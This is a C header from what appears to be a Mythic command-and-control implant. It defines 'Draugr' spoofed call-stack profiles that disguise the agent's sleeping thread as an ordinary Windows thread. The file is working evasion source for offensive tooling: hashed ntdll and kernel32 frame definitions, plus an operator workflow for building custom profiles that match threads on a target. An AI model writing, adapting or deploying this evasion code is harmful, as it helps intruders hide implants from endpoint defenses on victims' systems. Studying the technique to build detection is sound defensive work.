#ifndef STARBURST_EVASION_SPOOF_PROFILES_H
#define STARBURST_EVASION_SPOOF_PROFILES_H

/*
 * Draugr spoof profiles - operator-customizable call stack definitions.
 *
 * This file defines the synthetic call stack frames that Draugr presents
 * when the agent sleeps. Each profile specifies a sequence of frames that
 * mimic a legitimate Windows thread's call chain.
 *
 * WORKFLOW - Creating a custom profile:
 *
 *   1. On a representative target, open Process Hacker / System Informer
 *      and find a sleeping thread with the call stack you want to mimic.
 *
 *   2. Run getFunctionOffset.exe for each frame to get the correct offsets:
 *
 *        getFunctionOffset.exe ntdll.dll TpReleasePool 0x402
 *        getFunctionOffset.exe kernel32.dll BaseThreadInitThunk 0x14
 *        getFunctionOffset.exe ntdll.dll RtlUserThreadStart 0x21
 *
 *   3. Copy the generated frame entries into the SPOOF_PROFILE_CUSTOM
 *      section below.
 *
 *   4. Build with spoof_profile = "custom" in Mythic, or set
 *      #define SPOOF_PROFILE SPOOF_PROFILE_CUSTOM in config.h for
 *      manual builds.
 *
 * FRAME ORDER:
 *   Innermost frame first (closest to the sleep call), outermost last
 *   (thread entry point). Typically the last frame is RtlUserThreadStart.
 *
 * RESOLUTION MODES:
 *   - func_hash != 0: resolve function by hash, add offset within function
 *   - func_hash == 0: use offset as module-relative RVA (getFunctionOffset style)
 *
 * LIMITS:
 *   Maximum SPOOF_MAX_FRAMES (10) per profile. Typical stacks use 2-4.
 */

#include <constexpr.h>
#include <stdint.h>

#define SPOOF_MAX_FRAMES 10

struct SPOOF_FRAME_DEF {
    uint32_t module_hash;
    uint32_t func_hash;
    uint32_t offset;
};

static inline void populate_spoof_frames(
    SPOOF_FRAME_DEF* frames, uint32_t* count
) {
    uint32_t i = 0;

#if SPOOF_PROFILE == SPOOF_PROFILE_THREAD
    /* ── Thread profile ──
     * Mimics: NtWaitForSingleObject → BaseThreadInitThunk → RtlUserThreadStart
     * Common for main threads and CreateThread-spawned threads.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"kernel32.dll" );
    frames[i].func_hash   = expr::hash_string( "BaseThreadInitThunk" );
    frames[i].offset      = 0x14;
    i++;

    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "RtlUserThreadStart" );
    frames[i].offset      = 0x21;
    i++;

#elif SPOOF_PROFILE == SPOOF_PROFILE_WORKER
    /* ── Worker pool profile ──
     * Mimics: NtWaitForWorkViaWorkerFactory → TppWorkerThread → RtlUserThreadStart
     * Common for thread pool worker threads.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "TppWorkerThread" );
    frames[i].offset      = 0x2f;
    i++;

    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "RtlUserThreadStart" );
    frames[i].offset      = 0x21;
    i++;

#elif SPOOF_PROFILE == SPOOF_PROFILE_CUSTOM
    /* ── Custom profile ── OPERATOR: edit below ──
     *
     * Add your frames here. Use getFunctionOffset.exe output directly.
     *
     * Two formats supported:
     *
     *   Function + offset (portable across Windows builds):
     *     frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
     *     frames[i].func_hash   = expr::hash_string( "TpReleasePool" );
     *     frames[i].offset      = 0x402;
     *     i++;
     *
     *   Module RVA (exact, from getFunctionOffset -r output):
     *     frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
     *     frames[i].func_hash   = 0;
     *     frames[i].offset      = 0x550b2;
     *     i++;
     *
     * Example: 3-frame deep thread pool stack
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "TpReleasePool" );
    frames[i].offset      = 0x402;
    i++;

    frames[i].module_hash = expr::hash_string<wchar_t>( L"kernel32.dll" );
    frames[i].func_hash   = expr::hash_string( "BaseThreadInitThunk" );
    frames[i].offset      = 0x14;
    i++;

    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "RtlUserThreadStart" );
    frames[i].offset      = 0x21;
    i++;

#endif

    *count = i;
}

#endif
